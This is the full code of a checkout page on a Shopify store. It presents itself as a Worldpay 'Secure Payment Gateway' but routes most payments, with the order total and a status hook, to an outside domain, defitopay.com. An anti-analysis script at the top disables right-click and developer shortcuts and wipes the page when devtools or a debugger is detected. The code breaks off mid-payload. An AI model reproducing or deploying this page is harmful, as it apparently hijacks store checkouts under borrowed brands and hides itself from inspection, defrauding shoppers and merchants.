<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <!-- 
    ============================================================================
    SECURITY LAYER: ANTI-DEVTOOLS & CONTEXT MENU PROTECTION
    ============================================================================
  -->
  <script type="text/javascript">
    /**
     * 安全防护脚本：禁止右键、禁止快捷键打开开发者工具。
     * 当检测到调试环境时，自动清空页面并重定向。
     */
    (function () {
      // 1. 禁止右键菜单 (防止用户通过右键点击“检查”)
      document.addEventListener('contextmenu', function (e) {
        e.preventDefault();
      });

      // 2. 禁止常用的开发者工具快捷键
      document.onkeydown = function (e) {
        // F12 (123), Ctrl+Shift+I (73), Ctrl+Shift+J (74), Ctrl+U (85), Ctrl+S (83)
        if (e.keyCode === 123 || 
          (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || 
          (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) || 
          (e.metaKey && (e.keyCode === 85 || e.keyCode === 83))) {
          return false;
        }
      };

      /**
       * 销毁页面函数：清空内容并跳转空白页
       */
      function killPage() {
        document.body.innerHTML = "";
        window.location.replace('about:blank');
      }

      /**
       * 调试检测逻辑：根据窗口内外宽度差以及 debugger 响应时间判断
       */
      function detectDevTools() {
        const isRealMobile = /Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
        if (!isRealMobile) {
          const threshold = 160;
          const widthDiff = window.outerWidth - window.innerWidth > threshold;
          const heightDiff = window.outerHeight - window.innerHeight > threshold;
          if (widthDiff || heightDiff) { 
            killPage(); 
            return true; 
          }
        }
        
        // 基于时间差的 debugger 检测
        const start = performance.now();
        debugger;
        const end = performance.now();
        if (end - start > 50) { 
          killPage(); 
          return true; 
        }
        return false;
      }
      
      // 定时轮询检测
      setInterval(detectDevTools, 1000);
      window.addEventListener('resize', detectDevTools);
      window.addEventListener('load', detectDevTools);
    })();
  </script>

  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
  <title>Checkout - Secure Payment Gateway</title>

  <!-- 
    ============================================================================
    CSS STYLING: BEAUTIFIED & EXPANDED
    ============================================================================
  -->
  <style>
    /* === 基础全局重置 === */
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #fff;
      color: #333;
      margin: 0;
      padding: 0;
      -webkit-font-smoothing: antialiased;
      line-height: 1.5;
    }

    * {
      box-sizing: border-box;
    }

    /* === 响应式主容器 === */
    .main-container {
      display: flex;
      flex-wrap: wrap;
      max-width: 1100px;
      margin: 0 auto;
      min-height: 100vh;
    }

    /* === 左侧：表单输入区域 === */
    .form-section {
      flex: 1.2;
      padding: 40px;
      background: #fff;
      min-width: 350px;
      border-right: 1px solid #e1e1e1;
    }

    .section-title {
      font-size: 18px;
      font-weight: 600;
      margin: 35px 0 15px 0;
      padding-bottom: 10px;
      color: #333;
      text-transform: none;
    }

    .section-title:first-child {
      margin-top: 0;
    }

    .input-group {
      display: flex;
      gap: 12px;
      margin-bottom: 12px;
    }

    .input-box {
      flex: 1;
      margin-bottom: 12px;
      position: relative;
    }

    label.field-label {
      display: block;
      font-size: 13px;
      color: #555;
      margin-bottom: 6px;
      font-weight: 500;
    }

    input,
    select {
      width: 100%;
      padding: 13px;
      border: 1px solid #d9d9d9;
      border-radius: 5px;
      font-size: 14px;
      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
      background: #fff;
      color: #333;
      outline: none;
    }

    input:focus,
    select:focus {
      border-color: #2b5ef8;
      box-shadow: 0 0 0 1px #2b5ef8;
    }

    input::placeholder {
      color: #999;
    }

    /* === 支付方式列表样式 === */
    .payment-list {
      display: flex;
      flex-direction: column;
      gap: 8px;
      margin-top: 15px;
    }

    .payment-option {
      display: flex;
      align-items: center;
      padding: 18px 15px;
      background: #f4f4f4;
      border: 1px solid transparent;
      border-left: 5px solid transparent;
      border-radius: 4px;
      cursor: pointer;
      transition: all 0.25s ease;
      position: relative;
    }

    .payment-option:hover {
      background: #ededed;
    }

    .payment-option.selected {
      background-color: #F9FDFA;
      border: 1px solid #e1e1e1;
      border-left: 5px solid #2b5ef8;
    }

    .payment-option input[type="radio"] {
      width: 18px;
      height: 18px;
      margin-right: 15px;
      accent-color: #2b5ef8;
      cursor: pointer;
    }

    .payment-name {
      font-size: 15px;
      font-weight: 500;
      color: #333;
      flex: 1;
    }

    .payment-icon {
      max-height: 24px;
      width: auto;
      max-width: 200px;
      object-fit: contain;
      margin-left: 10px;
      vertical-align: middle;
      image-rendering: -webkit-optimize-contrast;
    }

    /* === 运费选择区域 === */
    .shipping-method-item {
      display: flex;
      align-items: center;
      padding: 15px;
      border: 1px solid #d9d9d9;
      border-radius: 5px;
      margin-bottom: 10px;
      cursor: pointer;
      transition: background 0.2s;
    }

    .shipping-method-item.selected {
      border-color: #2b5ef8;
      background-color: #f9fdfa;
      box-shadow: 0 2px 4px rgba(0,0,0,0.02);
    }

    .shipping-method-item input {
      margin-right: 15px;
      width: auto;
      accent-color: #2b5ef8;
    }

    /* === 右侧：订单摘要区域 === */
    .summary-section {
      flex: 0.8;
      background: #fafafa;
      min-width: 320px;
      border-left: 1px solid #e1e1e1;
      padding: 40px;
    }

    /* 移动端摘要切换器 */
    .mobile-summary-toggle {
      display: none;
      background: #fafafa;
      border-bottom: 1px solid #e1e1e1;
      border-top: 1px solid #e1e1e1;
      padding: 18px 20px;
      cursor: pointer;
      justify-content: space-between;
      align-items: center;
      user-select: none;
    }

    .toggle-left {
      display: flex;
      align-items: center;
      color: #197bbd;
      font-size: 14px;
      font-weight: 500;
    }

    .toggle-left svg {
      fill: #197bbd;
      margin-right: 8px;
      width: 14px;
      height: 14px;
    }

    .toggle-chevron {
      margin-left: 6px;
      transition: transform 0.3s ease;
    }

    .toggle-total {
      font-size: 18px;
      font-weight: 600;
      color: #333;
    }

    .mobile-summary-toggle.expanded .toggle-chevron {
      transform: rotate(180deg);
    }

    .summary-content {
      display: block;
    }

    /* 商品列表渲染 */
    .product-list {
      margin-bottom: 20px;
      margin-top: 10px;
    }

    .product-item {
      display: flex;
      align-items: center;
      margin-bottom: 15px;
    }

    .product-img-wrapper {
      position: relative;
      margin-right: 15px;
    }

    .product-img {
      width: 64px;
      height: 64px;
      background: #fff;
      border: 1px solid #e1e1e1;
      border-radius: 8px;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .product-img img {
      width: 100%;
      height: 100%;
      object-fit: contain;
    }

    .product-qty-badge {
      position: absolute;
      top: -8px;
      right: -8px;
      background: #727272;
      opacity: 0.9;
      color: #fff;
      font-size: 12px;
      font-weight: 500;
      width: 20px;
      height: 20px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2;
    }

    .product-info {
      flex: 1;
      font-size: 14px;
      color: #333;
      font-weight: 500;
      line-height: 1.4;
    }

    .product-variant {
      font-size: 12px;
      color: #717171;
      font-weight: 400;
    }

    .product-price {
      font-size: 14px;
      font-weight: 500;
      color: #333;
      text-align: right;
    }

    /* 金额行基础样式 */
    .summary-line {
      display: flex;
      justify-content: space-between;
      margin-top: 12px;
      font-size: 14px;
      color: #555;
    }

    /* 底部总计行 */
    .total-line {
      margin-top: 20px;
      padding-top: 20px;
      border-top: 1px solid #e1e1e1;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .total-label {
      font-size: 16px;
      font-weight: 500;
      color: #333;
    }

    .total-price {
      font-size: 24px;
      font-weight: 600;
      color: #333;
      letter-spacing: -0.5px;
    }

    .currency-tag {
      font-size: 12px;
      color: #717171;
      margin-left: 5px;
      font-weight: 400;
      vertical-align: middle;
    }

    /* 提交按钮样式 */
    button#submit-btn {
      width: 100%;
      padding: 18px;
      background: #3e6cf5;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-weight: 600;
      font-size: 16px;
      cursor: pointer;
      margin-top: 30px;
      transition: background 0.3s ease;
    }

    button#submit-btn:hover {
      background: #1650FF;
    }

    button#submit-btn:disabled {
      background: #ccc;
      cursor: not-allowed;
    }

    /* === 优惠券输入与展示美化 === */
    .discount-input-wrapper {
      display: flex;
      gap: 10px;
      margin: 20px 0;
    }

    .discount-input-wrapper input {
      flex: 1;
      margin-bottom: 0 !important;
    }

    .btn-apply {
      padding: 0 20px;
      background: #f1f1f1;
      border: 1px solid #d9d9d9;
      border-radius: 5px;
      cursor: pointer;
      font-weight: 500;
      color: #333;
      transition: all 0.2s;
    }

    .btn-apply:hover {
      background: #e5e5e5;
    }

    /* 折扣行样式：显示优惠码标题 */
    .discount-line-item {
      display: none; /* 默认隐藏，JS 激活 */
      justify-content: space-between;
      margin-top: 12px;
      font-size: 14px;
      color: #333;
    }

    .discount-detail-label {
      display: flex;
      flex-direction: column;
    }

    .discount-code-tag {
      font-size: 12px;
      color: #717171;
      margin-top: 2px;
      display: flex;
      align-items: center;
    }

    /* 产品划线价格与折扣标签 */
    .price-original {
      text-decoration: line-through;
      color: #717171;
      font-size: 12px;
      margin-right: 5px;
    }

    .product-discount-badge {
      display: flex;
      align-items: center;
      font-size: 11px;
      color: #717171;
      margin-top: 5px;
      font-weight: 500;
      text-transform: uppercase;
    }

    /* TOTAL SAVINGS 模块 */
    .savings-summary-box {
      margin-top: 15px;
      padding: 12px;
      background: #f4f4f4;
      border: 1px solid #e1e1e1;
      border-radius: 4px;
      display: none; /* 默认隐藏 */
      align-items: center;
      font-weight: 600;
      font-size: 15px;
      color: #333;
    }

    .savings-summary-box svg {
      width: 18px;
      height: 18px;
      margin-right: 10px;
      fill: #333;
    }

    /* === 翻译选择器样式 === */
    .lang-switcher-wrapper {
      display: flex;
      align-items: center;
      justify-content: flex-end;
      margin-bottom: 15px;
    }

    .lang-switcher-wrapper select {
      width: auto;
      padding: 6px 10px;
      font-size: 13px;
      border: 1px solid #d9d9d9;
      border-radius: 4px;
      cursor: pointer;
      background: #fff;
    }

    .pc-lang-switcher {
      margin-top: 25px;
      border-top: 1px solid #e1e1e1;
      padding-top: 15px;
    }

    /* === 遮罩层加载动画 === */
    #wcr-a-payment-loader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.4);
      z-index: 10000000;
      display: none;
      justify-content: center;
      align-items: center;
      backdrop-filter: blur(3px);
    }

    .wcr-a-loader-content {
      background: #ffffff;
      padding: 35px 45px;
      border-radius: 12px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
      display: flex;
      flex-direction: column;
      align-items: center;
      max-width: 90%;
      width: 350px;
      text-align: center;
    }

    .wcr-a-spinner {
      width: 45px;
      height: 45px;
      border: 3px solid #f3f3f3;
      border-top: 3px solid #2ecc71;
      border-radius: 50%;
      animation: wcr-a-spin 0.4s linear infinite;
      margin-bottom: 25px;
    }

    @keyframes wcr-a-spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .wcr-a-text {
      font-family: inherit;
      font-size: 16px;
      color: #333;
      font-weight: 500;
      line-height: 1.5;
    }

    /* === 移动端适配适配 === */
    @media (max-width: 900px) {
      .main-container {
        flex-direction: column-reverse;
      }

      .form-section {
        padding: 25px;
        border-right: none;
      }

      .summary-section {
        padding: 0;
        background: #fafafa;
        border-left: none;
        width: 100%;
        position: sticky;
        top: 0;
        z-index: 999;
        box-shadow: 0 4px 10px rgba(0,0,0,0.06);
      }

      .mobile-summary-toggle {
        display: flex;
      }

      .summary-content {
        display: none;
        padding: 20px;
        border-bottom: 1px solid #e1e1e1;
        max-height: 70vh;
        overflow-y: auto;
      }

      .summary-content.show {
        display: block;
      }

      .pc-lang-switcher {
        display: none;
      }
    }

    .trust-badges {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 25px;
      margin-top: 25px;
      margin-bottom: 15px;
    }

    .trust-badges img {
      height: 38px;
      width: auto;
      opacity: 0.85;
    }
  </style>
</head>

<body>

  <div class="main-container">
    <!-- LEFT: CHECKOUT FORM SECTION -->
    <div class="form-section">
      <!-- MOBILE LANGUAGE SELECTOR -->
      <div class="lang-switcher-wrapper mobile-lang-switcher">
        <select class="lang-selector">
          <option value="en">English</option>
          <option value="ja">日本語</option>
          <option value="ko">한국어</option>
          <option value="zh-TW">繁體中文</option>
        </select>
      </div>

      <form id="payment-form">
        <!-- CONTACT INFO -->
        <div class="section-title" data-i18n="title_contact">Contact</div>
        <div class="input-box">
          <label class="field-label" data-i18n="label_email">Email Address</label>
          <input type="email" id="email" required placeholder="email@example.com">
        </div>
        <div class="input-box">
          <label class="field-label" data-i18n="label_phone">Phone</label>
          <input type="tel" id="phone" required placeholder="Phone number">
        </div>

        <!-- SHIPPING INFO -->
        <div class="section-title" data-i18n="title_shipping">Shipping Address</div>
        <div class="input-box">
          <label class="field-label" data-i18n="label_country">Country/Region</label>
          <select id="country" required>
            <option value="" disabled selected data-i18n="select_country">Select Country/Region</option>
          </select>
        </div>

        <div class="input-group">
          <div class="input-box">
            <label class="field-label" data-i18n="label_fname">First Name</label>
            <input type="text" id="fname" required>
          </div>
          <div class="input-box">
            <label class="field-label" data-i18n="label_lname">Last Name</label>
            <input type="text" id="lname" required>
          </div>
        </div>

        <div class="input-box">
          <label class="field-label" data-i18n="label_address">Address</label>
          <input type="text" id="address" required placeholder="Street, House No.">
        </div>

        <div class="input-group">
          <div class="input-box">
            <label class="field-label" data-i18n="label_city">City</label>
            <input type="text" id="city" required>
          </div>
          <div class="input-box">
            <label class="field-label" data-i18n="label_state">State / Province</label>
            <input type="text" id="state" required>
          </div>
          <div class="input-box">
            <label class="field-label" data-i18n="label_zip">ZIP Code</label>
            <input type="text" id="zip" required>
          </div>
        </div>

        <!-- SHIPPING METHODS -->
        <div id="shipping-method-area" style="display:none;">
          <div class="section-title" data-i18n="title_shipping_method">Shipping Method</div>
          <div id="shipping-rates-list"></div>
        </div>

        <!-- PAYMENT METHODS -->
        <div class="section-title" data-i18n="title_payment">Payment Method</div>
        <div id="payment-container" class="payment-list">
          <div style="padding:15px; color:#666; font-size:14px;">Loading payment options...</div>
        </div>
        <input type="hidden" id="gateway" required>

        <button type="submit" id="submit-btn" data-i18n="btn_place_order">PLACE ORDER</button>

        <!-- TRUST BADGES -->
        <div class="trust-badges">
          <img src="https://image.defitopay.com/worldgate.svg" alt="Secured by WorldGate">
          <img src="https://image.defitopay.com/pci.svg" alt="PCI DSS Compliant">
        </div>

        <div style="margin-top:20px; text-align: center; font-weight: bold; font-size: 11px; color:#bbb;">
          Copyright 2026 Worldpay LLC, and its affiliates.
        </div>
      </form>
    </div>

    <!-- RIGHT: ORDER SUMMARY SECTION -->
    <div class="summary-section">
      <!-- MOBILE TOGGLE BAR -->
      <div class="mobile-summary-toggle" id="summaryToggle">
        <div class="toggle-left">
          <svg viewBox="0 0 20 20">
            <path d="M17.178 13.088H5.453c-.454 0-.91-.364-.908-.82l.148-4.408c.002-.455.463-.82.914-.82h11.569c.454 0 .91.364.908.82l-.148 4.408c-.002.455-.463.82-.914.82zm3.427-12.35l-1.659 7.902c-.244 1.163-1.554 2.14-2.84 2.14l-1.07.001c-.002.502-.005 1.004-.007 1.505 0 1.256-1.015 2.275-2.268 2.275-1.252 0-2.268-1.02-2.268-2.275 0-.501.005-1.003.007-1.505l-3.32.003c.003.502.006 1.004.008 1.505 0 1.256-1.015 2.275-2.268 2.275-1.252 0-2.268-1.02-2.268-2.275 0-.501.004-1.003.007-1.505L.804 5.672C.555 4.54.167 2.663.072 2.185.02 1.926-.01 1.696.002 1.507.037.95.342.602.83.602h2.23c.84 0 1.631.542 1.928 1.32L5.89 4.39c.603 0 1.206-.002 1.808-.002V2.85c0-1.57 1.27-2.848 2.835-2.848 1.566 0 2.836 1.278 2.836 2.849v1.538c.602 0 1.204.002 1.806.002l.745-2.12c.26-.74.966-1.268 1.76-1.268h2.09c.49 0 .807.36.852.92.02.247.01.536-.068.818zM11.69 2.85c0-.907-.733-1.642-1.637-1.642-.903 0-1.637.735-1.637 1.642v1.54h3.273V2.85z"></path>
          </svg>
          <span id="toggleText" data-i18n="toggle_show">Show order summary</span>
          <svg class="toggle-chevron" viewBox="0 0 10 7" style="width:10px; height:7px; fill:none; stroke:#197bbd; stroke-width:2px; margin-left: 6px;">
            <path d="M1 1L5 5L9 1" stroke-linecap="round" stroke-linejoin="round" />
          </svg>
        </div>
        <div class="toggle-total" id="mobile-total-display">$0.00</div>
      </div>

      <!-- MAIN SUMMARY CONTENT -->
      <div class="summary-content" id="summaryContent">
        <div id="product-list" class="product-list"></div>

        <!-- DISCOUNT INPUT BOX -->
        <div class="discount-input-wrapper">
          <input type="text" id="coupon-input" placeholder="Discount code or gift card">
          <button type="button" class="btn-apply" id="apply-coupon-btn" onclick="applyDiscount()">Apply</button>
        </div>

        <!-- FEES SUMMARY -->
        <div class="summary-line">
          <span data-i18n="summary_subtotal">Subtotal</span>
          <span id="subtotal-val">0.00</span>
        </div>
        
        <!-- DYNAMIC DISCOUNT ROW -->
        <div class="discount-line-item" id="discount-row">
          <div class="discount-detail-label">
            <span>Order discount</span>
            <span id="discount-detail-text" class="discount-code-tag"></span>
          </div>
          <span id="discount-val">- 0.00</span>
        </div>

        <div class="summary-line">
          <span data-i18n="summary_shipping">Shipping</span>
          <span id="shipping-display" data-i18n="summary_calc">Calculated at next step</span>
        </div>
        
        <!-- FINAL TOTAL -->
        <div class="total-line">
          <span class="total-label" data-i18n="summary_total">Total</span>
          <div style="display:flex; align-items:baseline;">
            <span class="currency-tag" id="currency-tag">USD</span>
            <span id="total-val" class="total-price">0.00</span>
          </div>
        </div>

        <!-- TOTAL SAVINGS MODULE -->
        <div class="savings-summary-box" id="savings-summary-box">
          <svg viewBox="0 0 16 16"><path d="M16 8c0 .28-.22.5-.5.5h-2.1c-.28 0-.5-.22-.5-.5s.22-.5.5-.5h2.1c.28 0 .5.22.5.5zm-5.41-3.41L12 3.17c.2-.2.2-.51 0-.71-.2-.2-.51-.2-.71 0L9.88 3.88c-.2.2-.2.51 0 .71.2.2.51.2.71 0zM4 12h8v2H4v-2zm0-3h8v2H4V9zm0-3h8v2H4V6zm10.71-3.71c-.2-.2-.51-.2-.71 0L12.59 3.7c-.2.2-.2.51 0 .71.2.2.51.2.71 0l1.41-1.41c.2-.2.2-.51 0-.71zM15 8c0-3.87-3.13-7-7-7S1 4.13 1 8s3.13 7 7 7 7-3.13 7-7zM8 2c3.31 0 6 2.69 6 6s-2.69 6-6 6-6-2.69-6-6 2.69-6 6-6z"/></svg>
          <span>TOTAL SAVINGS <span id="total-savings-val">0.00</span></span>
        </div>

        <!-- PC LANGUAGE SWITCHER -->
        <div class="lang-switcher-wrapper pc-lang-switcher">
          <select class="lang-selector">
            <option value="en">English</option>
            <option value="ja">日本語</option>
            <option value="ko">한국어</option>
            <option value="zh-TW">繁體中文</option>
          </select>
        </div>
      </div>
    </div>
  </div>

  <!-- LOADER MASK -->
  <div id="wcr-a-payment-loader">
    <div class="wcr-a-loader-content">
      <div class="wcr-a-spinner"></div>
      <div class="wcr-a-text">
        <div class="main-msg" data-i18n="mask_main">Securely launching payment</div>
        <div class="sub-msg" style="font-size: 14px; color: #2ecc71; font-weight: normal; margin-top: 5px;" data-i18n="mask_sub">
          Please do not exit or close this window
        </div>
      </div>
    </div>
  </div>

  <!-- 
    ============================================================================
    JAVASCRIPT: CORE LOGIC & API INTERACTION
    ============================================================================
  -->
  <script>
    /**
     * GLOBAL STATE & CONFIG
     */
    let currentCart = null;
    let selectedShippingRate = null;
    let availableShippingRates = [];
    let currentAppliedDiscounts = [];

    const shopifyOption = { id: 'shopify_checkout', name: 'Shopify Secure Checkout', icon: 'https://image.defitopay.com/global_pay.svg' };
    
    const currencyPaymentMap = {
      'USD': [shopifyOption],
      'JPY': [{ id: 'paypay', name: 'PayPay', icon: 'https://image.defitopay.com/paypay.svg' }, 
              { id: 'aupay', name: 'au Pay', icon: 'https://image.defitopay.com/aupay.svg' }, shopifyOption],
      'KRW': [{ id: 'kakaopay', name: 'KakaoPay', icon: 'https://image.defitopay.com/kakaopay.png' }, 
              { id: 'tosspay', name: 'Toss Pay', icon: 'https://image.defitopay.com/tosspay.png' }, 
              { id: 'naverpay', name: 'Naver Pay', icon: 'https://image.defitopay.com/naverpay.png' }, shopifyOption],
      'TWD': [{ id: 'jkopay', name: 'JKOPay', icon: 'https://image.defitopay.com/tw_jkopay.png' }, shopifyOption],
      'DEFAULT': [shopifyOption]
    };

    const allCountries = [
      { code: "US", name: "United States" }, 
      { code: "JP", name: "日本国" }, 
      { code: "KR", name: "대한민국" }, 
      { code: "TW", name: "Taiwan" }, 
      { code: "HK", name: "Hong Kong" }, 
      { code: "GB", name: "United Kingdom" }, 
      { code: "CA", name: "Canada" }, 
      { code: "AU", name: "Australia" }
    ];

    /**
     * MULTI-LANGUAGE ENGINE
     */
    async function applyLanguage(lang) {
      const BASE_URL = 'https://worldpay-shopify-to-wordpress-ant-live.pages.dev'; 
      try {
        const cacheBuster = Date.now();
        const res = await fetch(`${BASE_URL}/translate/${lang}.json?v=${cacheBuster}`);
        if (!res.ok) return;
        const trans = await res.json();

        // Translate text content
        document.querySelectorAll('[data-i18n]').forEach(el => {
          const key = el.getAttribute('data-i18n');
          if (trans[key]) el.textContent = trans[key];
        });

        // Translate placeholders
        const placeholders = { 'email': 'placeholder_email', 'address': 'placeholder_address', 'phone': 'placeholder_phone' };
        for (let id in placeholders) {
          const el = document.getElementById(id);
          if (el && trans[placeholders[id]]) el.placeholder = trans[placeholders[id]];
        }

        document.querySelectorAll('.lang-selector').forEach(s => s.value = lang);
        localStorage.setItem('preferred_lang', lang);
      } catch (e) { console.error('i18n load error'); }
    }

    /**
     * UI DATA BINDING & UPDATES
     */
    async function loadCartData() {
      try {
        // Fetch real-time data from Shopify Cart API
        const res = await fetch('/cart.js');
        currentCart = await res.json();
        
        // Extract cart-level discounts (Manual or Automatic)
        currentAppliedDiscounts = currentCart.cart_level_discount_applications || [];
        
        document.getElementById('currency-tag').innerText = currentCart.currency;
        renderPaymentMethods(currentCart.currency); 
        updateTotalDisplay();
      } catch (err) { console.error("Cart loading failed", err); }
    }

    function updateTotalDisplay() {
      if (!currentCart) return;
      
      const currency = currentCart.currency;
      let calculatedSavings = 0;
      let productHtml = '';

      // 1. Process items and line-level discounts
      currentCart.items.forEach(item => {
        const originalLine = item.original_line_price / 100;
        const finalLine = item.final_line_price / 100;
        const lineDiscount = originalLine - finalLine;
        calculatedSavings += lineDiscount;

        let badges = '';
        if (item.line_level_discount_allocations) {
          item.line_level_discount_allocations.forEach(d => {
            badges += `
              <div class="product-discount-badge">
                [${d.discount_application.title}] -${(d.amount/100).toFixed(2)} ${currency}
              </div>`;
          });
        }

        productHtml += `
          <div class="product-item">
            <div class="product-img-wrapper">
              <div class="product-img"><img src="${item.image}"></div>
              <div class="product-qty-badge">${item.quantity}</div>
            </div>
            <div class="product-info">
              <div style="font-weight:600;">${item.product_title}</div>
              <div class="product-variant">${item.variant_title || ''}</div>
              ${badges}
            </div>
            <div class="product-price">
              ${lineDiscount > 0 ? `<span class="price-original">${originalLine.toFixed(2)}</span>` : ''}
              <span class="price-current">${finalLinePriceText(finalLine)} ${currency}</span>
            </div>
          </div>`;
      });
      document.getElementById('product-list').innerHTML = productHtml;

      // 2. Calculate totals using Shopify's logic
      // Total Discount includes both line level and cart level
      const totalDiscountAmount = (currentCart.total_discount / 100);
      const subtotalPostDiscount = (currentCart.total_price / 100);
      const shipPrice = selectedShippingRate ? parseFloat(selectedShippingRate.price) : 0;
      const finalGrandTotal = subtotalPostDiscount + shipPrice;

      // 3. Render summary lines
      document.getElementById('subtotal-val').innerText = subtotalPostDiscount.toFixed(2) + " " + currency;
      
      const discountRow = document.getElementById('discount-row');
      const savingsBox = document.getElementById('savings-summary-box');

      if (totalDiscountAmount > 0) {
        discountRow.style.display = 'flex';
        document.getElementById('discount-val').innerText = "- " + totalDiscountAmount.toFixed(2) + " " + currency;
        
        // Display the first matching discount title
        let mainTitle = "Bundle Discount";
        if (currentAppliedDiscounts.length > 0) {
          mainTitle = currentAppliedDiscounts[0].title;
        } else if (currentCart.items.some(i => i.line_level_discount_allocations.length > 0)) {
          mainTitle = currentCart.items.find(i => i.line_level_discount_allocations.length > 0).line_level_discount_allocations[0].discount_application.title;
        }
        document.getElementById('discount-detail-text').innerText = mainTitle;
        
        savingsBox.style.display = 'flex';
        document.getElementById('total-savings-val').innerText = totalDiscountAmount.toFixed(2) + " " + currency;
      } else {
        discountRow.style.display = 'none';
        savingsBox.style.display = 'none';
      }

      // Shipping label update
      if (selectedShippingRate) {
        document.getElementById('shipping-display').innerText = shipPrice.toFixed(2) + " " + currency;
      } else {
        document.getElementById('shipping-display').innerText = "Calculated at next step";
      }

      // FINAL FIGURES
      document.getElementById('total-val').innerText = finalGrandTotal.toFixed(2);
      document.getElementById('mobile-total-display').innerText = finalGrandTotal.toFixed(2) + " " + currency;
      
      // Store globally for payment payload
      window.finalPayAmount = finalGrandTotal.toFixed(2);
      window.finalDiscountCode = currentAppliedDiscounts.length > 0 ? currentAppliedDiscounts[0].title : "";
      window.finalDiscountVal = totalDiscountAmount.toFixed(2);
    }

    function finalLinePriceText(val) { return val.toFixed(2); }

    /**
     * DISCOUNT CODE APPLICATION
     */
    window.applyDiscount = async function() {
      const codeInput = document.getElementById('coupon-input');
      const code = codeInput.value.trim();
      if (!code) return;

      const btn = document.getElementById('apply-coupon-btn');
      btn.innerText = "Applying...";
      btn.disabled = true;

      try {
        // Shopify Discount Endpoint
        await fetch(`/discount/${encodeURIComponent(code)}`);
        // Refresh cart data to see what Shopify applied
        await loadCartData();
        codeInput.value = "";
      } catch (e) {
        alert("Coupon application failed. Please try again.");
      } finally {
        btn.innerText = "Apply";
        btn.disabled = false;
      }
    };

    /**
     * SHIPPING CALCULATION
     */
    async function fetchShippingRates() {
      const country = document.getElementById('country').value;
      const state = document.getElementById('state').value;
      const zip = document.getElementById('zip').value;
      
      if (!zip || zip.length < 3 || !country) return;

      const listDiv = document.getElementById('shipping-rates-list');
      document.getElementById('shipping-method-area').style.display = 'block';
      listDiv.innerHTML = "<div style='padding:10px; color:#666;'>Finding rates...</div>";

      try {
        const query = `shipping_address[zip]=${encodeURIComponent(zip)}&shipping_address[country]=${encodeURIComponent(country)}&shipping_address[province]=${encodeURIComponent(state)}`;
        const res = await fetch(`/cart/shipping_rates.json?${query}`);
        const data = await res.json();
        
        availableShippingRates = data.shipping_rates;
        if (availableShippingRates && availableShippingRates.length > 0) {
          let html = '';
          availableShippingRates.forEach((rate, index) => {
            if (index === 0) selectedShippingRate = rate;
            const isSelected = index === 0;
            html += `
              <div class="shipping-method-item ${isSelected ? 'selected' : ''}" onclick="selectShipping(${index})">
                <input type="radio" name="sh_radio" ${isSelected ? 'checked' : ''}>
                <div style="flex:1;">${rate.name}</div>
                <div style="font-weight:bold;">${rate.price} ${currentCart.currency}</div>
              </div>`;
          });
          listDiv.innerHTML = html;
          updateTotalDisplay();
        } else {
          listDiv.innerHTML = "<div style='padding:10px; color:red;'>No shipping methods available for this location.</div>";
        }
      } catch (err) {
        listDiv.innerHTML = "Error loading shipping rates.";
      }
    }

    window.selectShipping = function(index) {
      selectedShippingRate = availableShippingRates[index];
      const items = document.querySelectorAll('.shipping-method-item');
      items.forEach((el, i) => {
        if (i === index) el.classList.add('selected');
        else el.classList.remove('selected');
      });
      updateTotalDisplay();
    };

    /**
     * PAYMENT GATEWAY ROUTING
     */
    function renderPaymentMethods(currency) {
      const container = document.getElementById('payment-container');
      const methods = currencyPaymentMap[currency] || currencyPaymentMap['DEFAULT'];
      let html = '';
      
      methods.forEach((m, index) => {
        const isChecked = index === 0;
        if (isChecked) document.getElementById('gateway').value = m.id;
        html += `
          <label class="payment-option ${isChecked ? 'selected' : ''}" onclick="selectPayment(this, '${m.id}')">
            <input type="radio" name="payment_radio" ${isChecked ? 'checked' : ''}>
            <div class="payment-name">${m.name}</div>
            <img src="${m.icon}" alt="${m.name}" class="payment-icon">
          </label>`;
      });
      container.innerHTML = html;
    }

    window.selectPayment = function (el, gatewayId) {
      document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('selected'));
      el.classList.add('selected');
      el.querySelector('input').checked = true;
      document.getElementById('gateway').value = gatewayId;
    };

    /**
     * FORM SUBMISSION & PAYLOAD DELIVERY
     */
    document.getElementById('payment-form').onsubmit = async function(e) {
      e.preventDefault();
      
      const gateway = document.getElementById('gateway').value;
      const btn = document.getElementById('submit-btn');
      if (!gateway) return;

      document.getElementById('wcr-a-payment-loader').style.display = 'flex';

      // Scenario 1: Fallback to Shopify Native Checkout
      if (gateway === 'shopify_checkout') {
        const p = new URLSearchParams();
        const map = { 
          'checkout[email]': 'email', 
          'checkout[shipping_address][first_name]': 'fname', 
          'checkout[shipping_address][last_name]': 'lname', 
          'checkout[shipping_address][address1]': 'address', 
          'checkout[shipping_address][city]': 'city', 
          'checkout[shipping_address][country]': 'country', 
          'checkout[shipping_address][province]': 'state', 
          'checkout[shipping_address][zip]': 'zip', 
          'checkout[shipping_address][phone]': 'phone' 
        };
        for (let k in map) { p.append(k, document.getElementById(map[k]).value); }
        window.top.location.href = '/checkout?' + p.toString();
        return;
      }

      // Scenario 2: Secure Payment Gateway Handshake
      btn.disabled = true;
      const payload = {
        order_id: "SH-" + Date.now() + Math.floor(Math.random() * 1000).toString(),
        total_amount: window.finalPayAmount,
        currency: currentCart.currency,
        gateway_mask: gateway,
        origin_domain: window.location.host,
        return_url: window.location.origin + "/pages/thank-you",
        hook_url: "https://test-pay.defitopay.com/api/v2/an/status-update",
        
        // Pass the actual discount information to the gateway
        discount_code: window.finalDiscountCode || "",
        discount_amount: window.finalDiscountVal || 0,
